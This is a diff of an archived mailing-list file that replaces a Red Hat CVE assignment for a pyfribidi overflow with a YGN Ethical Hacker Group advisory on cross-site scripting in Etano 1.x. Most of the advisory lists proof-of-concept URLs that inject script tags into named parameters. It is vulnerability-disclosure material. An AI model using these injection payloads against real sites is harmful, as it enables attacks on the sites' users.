@@ -1,34 +1,125 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/14/9
-Message-ID: <4F60DD87.8090109@redhat.com>
-Date: Wed, 14 Mar 2012 12:03:51 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-CC: Vincent Danen <vdanen@...hat.com>
-Subject: Re: CVE request: pyfribidi buffer overflow flaw
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/05/15
+Message-ID: <CAPYM6VzMjVmu4HJ6SSrHAbuYu0gKvvjtY=+dQHytHvF3AcQSGA@mail.gmail.com>
+Date: Tue, 6 Mar 2012 00:55:03 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
+Subject: Etano 1.x <= Multiple Cross Site Scripting Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On 03/14/2012 09:24 AM, Vincent Danen wrote:
-> Could a CVE be assigned for this issue please?  I don't think it's come
-> through here yet.
-> 
-> A buffer overflow flaw was reported in pyfribidi's
-> fribidi_utf8_to_unicode() function, due to it handling at most 3 bytes
-> for a single unicode character.  If a 4-byte utf-8 sequence was
-> supplied, it would generate 2 unicode characters which would overflow
-> the logical buffer.  This has been fixed in pyfribidi 0.11.
-> 
-> References:
-> 
-> http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=663189
-> https://github.com/pediapress/pyfribidi/issues/2
-> https://github.com/pediapress/pyfribidi/commit/d2860c655357975e7b32d84e6b45e98f0dcecd7a
-> 
-> http://www.securityfocus.com/bid/52451/info
-> https://bugzilla.redhat.com/show_bug.cgi?id=801896
-> 
+1. OVERVIEW
 
-Please use CVE-2012-1176 for this issue.
+Etano 1.x versions are vulnerable to Cross Site Scripting.
 
--- 
-Kurt Seifried Red Hat Security Response Team (SRT)
+
+2. BACKGROUND
+
+The community builder script we provide - Etano - was built entirely
+based on requests from customers of our previous dating package
+(Dating Site Builder). Almost every feature ever requested was built
+into Etano to help you build a better site for your community members.
+You can use Etano to start up a dating site, a social networking site,
+a classifieds site or any other type of site involving groups of
+people, companies, products.
+
+
+3. VULNERABILITY DESCRIPTION
+
+Multiple parameters were not properly sanitized upon submission to
+join.php, search.php, photo_search.php and photo_view.php , which
+allows attacker to conduct Cross Site Scripting attack. This may allow
+an attacker to create a specially crafted URL that would execute
+arbitrary script code in a victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+Tested in 1.x versions (1.20-1.22)
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+URL: http://localhost/etano/join.php
+Method: POST
+Vulnerable Parameters: user, email, email2, f17_zip, agree
+
+------------------------------------------------------------------------------------------------
+
+URL: http://localhost/etano/search.php
+Method: GET
+Vulnerable Parameters: QUERY STRING, st, f17_city,f17_country ,
+f17_state, f17_zip, f19, wphoto, search, v, return
+
+
+http://localhost/etano/search.php?'"><script>alert(/XSS/)</script>
+
+http://localhost/etano/search.php?st='"><script>alert(/XSS/)</script>
+
+http://localhost/etano/search.php?f17_city='"><script>alert(/XSS/)</script>&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country='"><script>alert(/XSS/)</script>&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state='"><script>alert(/XSS/)</script>&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip='"><script>alert(/XSS/)</script>&f19=0&st=basic&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19='"><script>alert(/XSS/)</script>&st=basic&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st='"><script>alert(/XSS/)</script>&wphoto=1
+
+http://localhost/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto='"><script>alert(/XSS/)</script>
+
+http://localhost/etano/search.php?search='"><script>alert(/XSS/)</script>&v=g
+
+http://localhost/etano/search.php?search=51d43831f5dde83a4eedb23895f165f6&v='"><script>alert(/XSS/)</script>
+
+http://localhost/etano/search.php?st=xss"><script>alert(/XSS/)</script>&user=unknown
+
+------------------------------------------------------------------------------------------------
+
+URL: http://localhost/etano/photo_search.php
+Method: GET
+Vulnerable Parameters: QUERY STRING, st, return
+
+http://localhost/etano/photo_search.php?'"><script>alert(/XSS/)</script>
+
+http://localhost/etano/photo_search.php?st='"><script>alert(/XSS/)</script>
+
+------------------------------------------------------------------------------------------------
+
+URL: http://localhost/etano/photo_view.php
+Method: GET
+Vulnerable Parameter: return
+
+http://localhost/etano/photo_view.php?photo_id=1&return="><script>alert(/XSS/)</script>
+
+
+6. SOLUTION
+
+The vendor hasn't released the fixed yet.
+
+
+7. VENDOR
+
+Datemill
+http://www.datemill.com/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-06-21: notified vendor
+2012-03-05: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5Betano_1.2.x%5D_xss
+
+
+#yehg [2012-03-05]
